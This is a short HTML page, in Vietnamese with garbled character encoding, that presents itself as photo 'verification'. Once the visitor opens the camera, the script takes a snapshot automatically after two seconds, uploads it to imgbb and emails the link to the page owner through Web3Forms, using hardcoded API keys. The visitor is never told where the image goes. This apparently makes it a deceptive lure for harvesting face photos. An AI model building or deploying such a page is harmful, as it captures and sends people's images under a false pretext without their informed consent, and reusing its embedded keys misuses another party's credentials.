<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ch·ª•p & G·ª≠i ·∫£nh</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(120deg,#74ebd5,#ACB6E5);
      height: 100vh; display: flex; justify-content: center; align-items: center;
    }
    .card {
      background: #fff; padding: 20px; border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      text-align: center; width: 350px;
    }
    h2 { margin-bottom: 15px; color: #333; }
    video, canvas, img {
      width: 100%; border-radius: 8px; margin-top: 10px;
    }
    button {
      margin-top: 12px; padding: 10px 14px;
      border: none; border-radius: 8px;
      background: #0078d7; color: #fff; font-size: 15px; cursor: pointer;
    }
    .msg { margin-top: 10px; font-size: 14px; }
    .err { color: #c62828; }
    .ok { color: #2e7d32; font-weight: bold; }
  </style>
</head>
<body>
  <div class="card">
    <h2>X√°c minh b·∫±ng ·∫£nh</h2>
    <button id="openCam">üì∏ M·ªü camera</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="preview" alt="·∫¢nh ch·ª•p" style="display:none;" />
    <div id="msg" class="msg"></div>
  </div>

  <script>
  const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
  const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";

  const msg = document.getElementById("msg");
  const openCamBtn = document.getElementById("openCam");
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const preview = document.getElementById("preview");
  let stream = null;

  const showError = t => { msg.textContent = "‚ùå " + t; msg.className = "msg err"; };
  const showOK = t => { msg.textContent = "‚úÖ " + t; msg.className = "msg ok"; };

  openCamBtn.onclick = async () => {
    openCamBtn.disabled = true;
    msg.textContent = "üîÑ ƒêang b·∫≠t camera...";
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      video.style.display = "block";

      // T·ª± ƒë·ªông ch·ª•p sau 2 gi√¢y
      setTimeout(captureAndSend, 2000);
    } catch (err) {
      showError("Kh√¥ng th·ªÉ m·ªü camera: " + err.message);
      openCamBtn.disabled = false;
    }
  };

  async function captureAndSend() {
    try {
      if (!video.videoWidth) {
        showError("Camera ch∆∞a s·∫µn s√†ng. Th·ª≠ l·∫°i.");
        openCamBtn.disabled = false;
        return;
      }

      msg.textContent = "üì∏ ƒêang ch·ª•p ·∫£nh...";
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const captured = canvas.toDataURL("image/png");

      preview.src = captured;
      preview.style.display = "block";
      video.style.display = "none";
      if (stream) stream.getTracks().forEach(t => t.stop());

      msg.textContent = "‚è≥ ƒêang t·∫£i ·∫£nh l√™n imgbb...";
      const form = new FormData();
      form.append("image", captured.split(",")[1]);

      const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {
        method: "POST", body: form
      });
      const imgRes = await upload.json();
      if (!imgRes.success) throw new Error("Upload imgbb th·∫•t b·∫°i: " + imgRes.error?.message);

      const imageUrl = imgRes.data.url;
      msg.textContent = "üì® ƒêang g·ª≠i ·∫£nh qua Web3Forms...";

      const payload = {
        access_key: WEB3FORMS_KEY,
        subject: "·∫¢nh x√°c minh m·ªõi",
        from_name: "Trang x√°c minh",
        message: `<img src="${imageUrl}" width="250" style="border-radius:8px;">`
      };

      const res = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
      });
      const result = await res.json();

      if (result.success) showOK("·∫¢nh ƒë√£ g·ª≠i th√†nh c√¥ng!");
      else showError("L·ªói g·ª≠i: " + result.message);
    } catch (err) {
      showError("L·ªói: " + err.message);
      openCamBtn.disabled = false;
    }
  }
  </script>
</body>
</html>
